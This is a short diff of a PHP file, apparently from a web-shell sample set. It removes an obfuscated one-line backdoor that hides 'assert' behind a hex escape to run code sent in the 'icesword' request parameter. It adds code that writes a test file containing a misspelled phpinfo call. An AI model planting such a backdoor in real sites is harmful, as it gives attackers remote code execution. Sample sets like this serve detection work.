@@ -1,1 +1,6 @@
-<?php array_map("ass\x65rt",(array)$_REQUEST['icesword']);?>
+<?php
+$a = "<?php phoinfo();?>";
+$b = fopen("a.test","w") or die("123!");
+fwrite($b,$a);
+fclose($b);
+?>
